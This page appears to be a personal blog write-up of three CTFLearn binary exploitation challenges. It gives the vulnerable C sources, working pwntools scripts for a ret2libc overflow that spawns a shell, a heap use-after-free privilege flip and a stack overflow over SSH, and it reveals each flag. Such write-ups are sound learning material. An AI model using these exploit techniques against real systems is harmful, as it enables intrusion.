@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <title>Lane Simmons 🤠</title>
+  <link rel="stylesheet" href="https://lcsimmons.github.io/style.css">
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+</head>
+
+<body>
+  <header>  
+    <div class="nav">
+        <h3> 
+          <ul>
+            <li><a href="https:&#x2F;&#x2F;lcsimmons.github.io&#x2F;">Lane Simmons </a></li>
+            <li><a href="/blog">Writeups </a></li>
+            <li><a href="https://github.com/lcsimmons">GitHub</a></li>
+          </ul>
+        </h3>
+    </div>
+  </header>
+  <section class="section">
+    <div class="container">
+      
+<div class="container">
+  <h1 class="title">
+    CTFLearn Binary
+  </h1>
+  
+  <div class="postcontainer">
+    <h3 id="table-of-contents">Table of Contents:</h3>
+<div class="toc">
+<ul>
+<li><a href="https://lcsimmons.github.io/blog/ctflearnbinary/#shell-time">Shell Time!</a></li>
+<li><a href="https://lcsimmons.github.io/blog/ctflearnbinary/#poor-login">Poor Login</a></li>
+<li><a href="https://lcsimmons.github.io/blog/ctflearnbinary/#blackbox">Blackbox</a></li>
+</ul>
+</div>
+<center>
+<h2 id="shell-time">Shell Time!</h2>
+</center>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>nc thekidofarcrania.com 4902
+</span></code></pre>
+<p>In a previous challenge, RIP my BOF, we were given the binary for the server and bof2.c. Whereas RIP my BOF needed flag.txt and wanted us to overwrite the instruction pointer with the address of win(), Shell Time! wants us to find flag2.txt. </p>
+<p>Source:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdio.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">string.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">unistd.h</span><span>&gt;
+</span><span>
+</span><span style="color:#65737e;">// Defined in a separate source file for simplicity.
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">init_visualize</span><span>(</span><span style="color:#b48ead;">char</span><span>* </span><span style="color:#bf616a;">buff</span><span>);
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">visualize</span><span>(</span><span style="color:#b48ead;">char</span><span>* </span><span style="color:#bf616a;">buff</span><span>);
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">win</span><span>() {
+</span><span>  </span><span style="color:#96b5b4;">system</span><span>(&quot;</span><span style="color:#a3be8c;">/bin/cat /flag.txt</span><span>&quot;);
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">vuln</span><span>() {
+</span><span>  </span><span style="color:#b48ead;">char</span><span> padding[</span><span style="color:#d08770;">16</span><span>];
+</span><span>  </span><span style="color:#b48ead;">char</span><span> buff[</span><span style="color:#d08770;">32</span><span>];
+</span><span>
+</span><span>  </span><span style="color:#96b5b4;">memset</span><span>(buff, </span><span style="color:#d08770;">0</span><span>, sizeof(buff)); </span><span style="color:#65737e;">// Zero-out the buffer.
+</span><span>  </span><span style="color:#96b5b4;">memset</span><span>(padding, </span><span style="color:#d08770;">0xFF</span><span>, sizeof(padding)); </span><span style="color:#65737e;">// Mark the padding with 0xff.
+</span><span>
+</span><span>  </span><span style="color:#65737e;">// Initializes the stack visualization. Don&#39;t worry about it!
+</span><span>  </span><span style="color:#bf616a;">init_visualize</span><span>(buff); 
+</span><span>
+</span><span>  </span><span style="color:#65737e;">// Prints out the stack before modification
+</span><span>  </span><span style="color:#bf616a;">visualize</span><span>(buff);
+</span><span>
+</span><span>  </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Input some text: </span><span>&quot;);
+</span><span>  </span><span style="color:#96b5b4;">gets</span><span>(buff); </span><span style="color:#65737e;">// This is a vulnerable call!
+</span><span>
+</span><span>  </span><span style="color:#65737e;">// Prints out the stack after modification
+</span><span>  </span><span style="color:#bf616a;">visualize</span><span>(buff); 
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span>() {
+</span><span>  </span><span style="color:#96b5b4;">setbuf</span><span>(stdout, </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>  </span><span style="color:#96b5b4;">setbuf</span><span>(stdin, </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>  </span><span style="color:#bf616a;">vuln</span><span>();
+</span><span>}
+</span><span>
+</span></code></pre>
+<p>I first leaked the address of puts. </p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>payload = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">a</span><span>&#39;*(</span><span style="color:#d08770;">60</span><span>) + </span><span style="color:#bf616a;">p32</span><span>(elf.plt[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;]) + </span><span style="color:#bf616a;">p32</span><span>(elf.symbols[&#39;</span><span style="color:#a3be8c;">main</span><span>&#39;]) + </span><span style="color:#bf616a;">p32</span><span>(elf.got[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;])
+</span></code></pre>
+<p>Once I had the address, I used https://libc.rip/ to leak the address of libc. With this, I then got the addresses for system and /bin/sh.</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>libc_addr = puts_addr - 0x67b40
+</span><span>system_addr = libc_addr + 0x3d200
+</span><span>bin_sh_addr = libc_addr + 0x17e0cf
+</span></code></pre>
+<p>I then sent the second payload (junk + system + junk + binsh), and from there, I got the shell and cat out flag2.txt</p>
+<p>Solve:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>elf = context.binary = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">./server</span><span>&#39;)
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">thekidofarcrania.com</span><span>&quot;, </span><span style="color:#d08770;">4902</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">text:</span><span>&quot;)
+</span><span>
+</span><span style="color:#65737e;"># Leaks the address of puts
+</span><span>payload = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">a</span><span>&#39;*(</span><span style="color:#d08770;">48</span><span>+</span><span style="color:#d08770;">12</span><span>) + </span><span style="color:#bf616a;">p32</span><span>(elf.plt[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;]) + </span><span style="color:#bf616a;">p32</span><span>(elf.symbols[&#39;</span><span style="color:#a3be8c;">main</span><span>&#39;]) + </span><span style="color:#bf616a;">p32</span><span>(elf.got[&#39;</span><span style="color:#a3be8c;">puts</span><span>&#39;])
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">address: </span><span>&quot;)
+</span><span>p.</span><span style="color:#bf616a;">recvline</span><span>()
+</span><span>p.</span><span style="color:#bf616a;">recvline</span><span>()
+</span><span>puts_addr = </span><span style="color:#bf616a;">u32</span><span>(p.</span><span style="color:#bf616a;">recv</span><span>(</span><span style="color:#d08770;">4</span><span>))
+</span><span>
+</span><span style="color:#65737e;"># Once we have the address of puts, we can leak libc
+</span><span>
+</span><span>libc_addr = puts_addr - </span><span style="color:#d08770;">0x67b40
+</span><span>system_addr = libc_addr + </span><span style="color:#d08770;">0x3d200
+</span><span>bin_sh_addr = libc_addr + </span><span style="color:#d08770;">0x17e0cf
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">text: </span><span>&quot;)
+</span><span>payload = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">a</span><span>&#39;*(</span><span style="color:#d08770;">48</span><span>+</span><span style="color:#d08770;">12</span><span>) + </span><span style="color:#bf616a;">p32</span><span>(system_addr) + </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0</span><span>) + </span><span style="color:#bf616a;">p32</span><span>(bin_sh_addr)
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>
+</span><span style="color:#65737e;"># We now have a shell
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">cat flag2.txt</span><span>&#39;)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+<details>
+  <summary id="reveal-flag">Reveal Flag</summary>
+  <p id="flag">CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}</p>
+</details>
+<hr />
+<center>
+<h2 id="poor-login">Poor Login</h2>
+</center>
+<p>h e a p </p>
+<details>
+  <summary id="source">View Source</summary>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">stdio.h</span><span>&gt;
+</span><span style="color:#b48ead;">#include </span><span>&lt;</span><span style="color:#a3be8c;">string.h</span><span>&gt;
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">menu</span><span>() {
+</span><span>  </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">*** WINBLOWS LOGIN *********</span><span style="color:#96b5b4;">\n</span><span>&quot;
+</span><span>      &quot;</span><span style="color:#a3be8c;">1. Login into user.</span><span style="color:#96b5b4;">\n</span><span>&quot;
+</span><span>      &quot;</span><span style="color:#a3be8c;">2. Sign out.</span><span style="color:#96b5b4;">\n</span><span>&quot;
+</span><span>      &quot;</span><span style="color:#a3be8c;">3. Print flag.</span><span style="color:#96b5b4;">\n</span><span>&quot;
+</span><span>      &quot;</span><span style="color:#a3be8c;">4. Lock user.</span><span style="color:#96b5b4;">\n</span><span>&quot;
+</span><span>      &quot;</span><span style="color:#a3be8c;">5. Restore user.</span><span style="color:#96b5b4;">\n</span><span>&quot;
+</span><span>      &quot;</span><span style="color:#a3be8c;">&gt; </span><span>&quot;);
+</span><span>  
+</span><span>  </span><span style="color:#b48ead;">int</span><span> resp = </span><span style="color:#d08770;">0</span><span>;
+</span><span>  </span><span style="color:#96b5b4;">scanf</span><span>(&quot;</span><span style="color:#d08770;">%d</span><span>&quot;, &amp;resp);
+</span><span>  </span><span style="color:#b48ead;">while </span><span>(</span><span style="color:#96b5b4;">getchar</span><span>() != &#39;</span><span style="color:#96b5b4;">\n</span><span>&#39;);
+</span><span>  </span><span style="color:#b48ead;">return</span><span> resp;
+</span><span>}
+</span><span>
+</span><span style="color:#b48ead;">struct </span><span>creds {
+</span><span>  </span><span style="color:#b48ead;">void </span><span>*padding;
+</span><span>  </span><span style="color:#b48ead;">char</span><span> name[</span><span style="color:#d08770;">32</span><span>];
+</span><span>  </span><span style="color:#b48ead;">int</span><span> admin;
+</span><span>};
+</span><span>
+</span><span>
+</span><span style="color:#b48ead;">struct</span><span> creds *curr;
+</span><span style="color:#b48ead;">struct</span><span> creds *save;
+</span><span>
+</span><span style="color:#b48ead;">char </span><span>*fake_flag;
+</span><span>
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span>() {
+</span><span>  </span><span style="color:#b48ead;">char</span><span> buff[</span><span style="color:#d08770;">64</span><span>];
+</span><span>
+</span><span>  </span><span style="color:#96b5b4;">setbuf</span><span>(stdout, </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>  </span><span style="color:#96b5b4;">setbuf</span><span>(stdin, </span><span style="color:#d08770;">NULL</span><span>);
+</span><span>
+</span><span>  </span><span style="color:#b48ead;">while </span><span>(</span><span style="color:#d08770;">1</span><span>) {
+</span><span>    </span><span style="color:#b48ead;">switch </span><span>(</span><span style="color:#bf616a;">menu</span><span>()) {
+</span><span>      </span><span style="color:#b48ead;">case </span><span style="color:#d08770;">1</span><span>:  </span><span style="color:#65737e;">// Login
+</span><span>        curr = </span><span style="color:#96b5b4;">malloc</span><span>(sizeof(*curr));
+</span><span>
+</span><span>        </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Username: </span><span>&quot;);
+</span><span>        </span><span style="color:#96b5b4;">fgets</span><span>(curr-&gt;name, sizeof(curr-&gt;name), stdin);
+</span><span>        </span><span style="color:#96b5b4;">strtok</span><span>(curr-&gt;name, &quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>
+</span><span>        curr-&gt;admin = </span><span style="color:#d08770;">0</span><span>; 
+</span><span>        </span><span style="color:#b48ead;">break</span><span>;
+</span><span>      </span><span style="color:#b48ead;">case </span><span style="color:#d08770;">2</span><span>: </span><span style="color:#65737e;">// Sign out
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(!curr) {
+</span><span>          </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">You are not logged in!</span><span>&quot;);
+</span><span>          </span><span style="color:#b48ead;">break</span><span>;
+</span><span>        }
+</span><span>        </span><span style="color:#96b5b4;">free</span><span>(curr);
+</span><span>        curr = </span><span style="color:#d08770;">NULL</span><span>;
+</span><span>        </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">You have been successfully logged out.</span><span>&quot;);
+</span><span>        </span><span style="color:#b48ead;">break</span><span>;
+</span><span>      </span><span style="color:#b48ead;">case </span><span style="color:#d08770;">3</span><span>: </span><span style="color:#65737e;">// Print flag
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(curr &amp;&amp; curr-&gt;admin) {
+</span><span>          </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">Here&#39;s your flag:</span><span>&quot;);
+</span><span>          </span><span style="color:#96b5b4;">system</span><span>(&quot;</span><span style="color:#a3be8c;">/bin/cat /flag.txt</span><span>&quot;);
+</span><span>        } </span><span style="color:#b48ead;">else </span><span>{
+</span><span>          </span><span style="color:#b48ead;">if </span><span>(!fake_flag) {
+</span><span>            </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">You are not admin. Would you like to create a new flag instead?</span><span>&quot;);
+</span><span>            </span><span style="color:#96b5b4;">fgets</span><span>(buff, sizeof(buff), stdin);
+</span><span>            fake_flag = </span><span style="color:#bf616a;">strdup</span><span>(buff);
+</span><span>          }
+</span><span>          </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Here&#39;s your flag: </span><span style="color:#d08770;">%s</span><span>&quot;, fake_flag);
+</span><span>        }
+</span><span>        </span><span style="color:#b48ead;">break</span><span>;
+</span><span>      </span><span style="color:#b48ead;">case </span><span style="color:#d08770;">4</span><span>: </span><span style="color:#65737e;">// Lock user
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(curr == </span><span style="color:#d08770;">NULL</span><span>) {
+</span><span>          </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">You are not logged in!</span><span>&quot;);
+</span><span>          </span><span style="color:#b48ead;">break</span><span>;
+</span><span>        }
+</span><span>
+</span><span>        </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">User has been locked now.</span><span>&quot;);
+</span><span>        save = curr; 
+</span><span>        </span><span style="color:#b48ead;">break</span><span>;
+</span><span>      </span><span style="color:#b48ead;">case </span><span style="color:#d08770;">5</span><span>: </span><span style="color:#65737e;">// Restore user
+</span><span>        </span><span style="color:#b48ead;">if </span><span>(curr != </span><span style="color:#d08770;">NULL</span><span>) {
+</span><span>          </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">You are already logged. Sign out first!</span><span>&quot;);
+</span><span>        } </span><span style="color:#b48ead;">else if </span><span>(save == </span><span style="color:#d08770;">NULL</span><span>) {
+</span><span>          </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">No user is currently locked!</span><span>&quot;);
+</span><span>        } </span><span style="color:#b48ead;">else </span><span>{
+</span><span>          </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Welcome back, </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">!</span><span style="color:#96b5b4;">\n</span><span>&quot;, save-&gt;name);
+</span><span>          curr = save;
+</span><span>          save = </span><span style="color:#d08770;">NULL</span><span>;
+</span><span>        }
+</span><span>        </span><span style="color:#b48ead;">break</span><span>;
+</span><span>      </span><span style="color:#b48ead;">default</span><span>:
+</span><span>        </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">Invalid choice</span><span>&quot;);
+</span><span>    }
+</span><span>  }
+</span><span>}
+</span></code></pre>
+</details>
+<p>After seeing free and malloc, I figured it was use after free time 😎</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#65737e;"># nc thekidofarcrania.com 13226
+</span><span>
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">thekidofarcrania.com</span><span>&quot;, </span><span style="color:#d08770;">13226</span><span>)
+</span><span style="color:#65737e;"># p = process(&#39;./login&#39;)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">1</span><span>&#39;)  </span><span style="color:#65737e;"># sends username  
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">username</span><span>&#39;)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">4</span><span>&#39;) </span><span style="color:#65737e;"># locks user
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">2</span><span>&#39;) </span><span style="color:#65737e;"># signs out 
+</span><span style="color:#65737e;"># signing out frees curr 
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">3</span><span>&#39;) </span><span style="color:#65737e;"># make a fakeflag
+</span><span>
+</span><span style="color:#65737e;"># creds buffer = 32 
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">a</span><span>&#39;*</span><span style="color:#d08770;">39 </span><span>+ </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">1</span><span>&#39;) </span><span style="color:#65737e;"># send fakeflag
+</span><span style="color:#65737e;"># 1 at the end so we set 1 for admin
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">5</span><span>&#39;) </span><span style="color:#65737e;"># restores user
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">3</span><span>&#39;) </span><span style="color:#65737e;"># prints flag
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+<details>
+  <summary id="reveal-flag">Reveal Flag</summary>
+  <p id="flag">CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP}</p>
+</details>
+<hr />
+<center>
+<h2 id="blackbox">Blackbox</h2>
+</center>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>ssh blackbox@104.131.79.111 -p 1001
+</span></code></pre>
+<p>Once we ssh, we can see a binary named blackbox and flag.txt. We don't have permission to read flag.txt, and if we run the binary we are greeted with this:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>What is 1 + 1 =
+</span></code></pre>
+<p>And if we try to answer 2, we see something like this:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>What is 1 + 1 = 2
+</span><span>No dummy... 1 + 1 != 0...
+</span></code></pre>
+<p>So, how do we get it to not say &quot;1 + 1 != 0...&quot;?</p>
+<p>I honestly solved this challenge with trial and error. I first tried to find the buffer, and once I was able to see how I could modify values, I adjusted so that 1 + 1 would be set to 2. </p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>s = </span><span style="color:#bf616a;">ssh</span><span>(&#39;</span><span style="color:#a3be8c;">blackbox</span><span>&#39;, &#39;</span><span style="color:#a3be8c;">104.131.79.111</span><span>&#39;, </span><span style="color:#bf616a;">port</span><span>=</span><span style="color:#d08770;">1001</span><span>, </span><span style="color:#bf616a;">password</span><span>=&#39;</span><span style="color:#a3be8c;">guest</span><span>&#39;)
+</span><span>sh = s.</span><span style="color:#bf616a;">run</span><span>(&#39;</span><span style="color:#a3be8c;">sh</span><span>&#39;)
+</span><span>
+</span><span>sh.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">./blackbox</span><span>&#39;)
+</span><span>
+</span><span>sh.</span><span style="color:#bf616a;">sendline</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">a</span><span>&#39;*</span><span style="color:#d08770;">80 </span><span>+ </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">2</span><span>))
+</span><span>
+</span><span style="color:#65737e;"># trial and error time 
+</span><span style="color:#65737e;"># b&#39;a&#39;*81 =&gt; 1 + 1 != 97
+</span><span style="color:#65737e;"># b&#39;a&#39;*88 =&gt; 1 + 1 != 1633771873
+</span><span style="color:#65737e;"># b&#39;a&#39;*89 =&gt; stack smashing detected
+</span><span>
+</span><span>sh.</span><span style="color:#bf616a;">recvline</span><span>()
+</span><span>log.</span><span style="color:#bf616a;">success</span><span>(&#39;</span><span style="color:#a3be8c;">Flag: </span><span>&#39; + sh.</span><span style="color:#bf616a;">recvline</span><span>().</span><span style="color:#bf616a;">decode</span><span>(&quot;</span><span style="color:#a3be8c;">utf-8</span><span>&quot;))
+</span></code></pre>
+<details>
+  <summary id="reveal-flag">Reveal Flag</summary>
+  <p id="flag">flag{0n3_4lus_1_1s_Tw0_dumm13!!}</p>
+</details>
+  </div>
+</div>
+
+    </div>
+  </section>
+</body>
+
+</html>
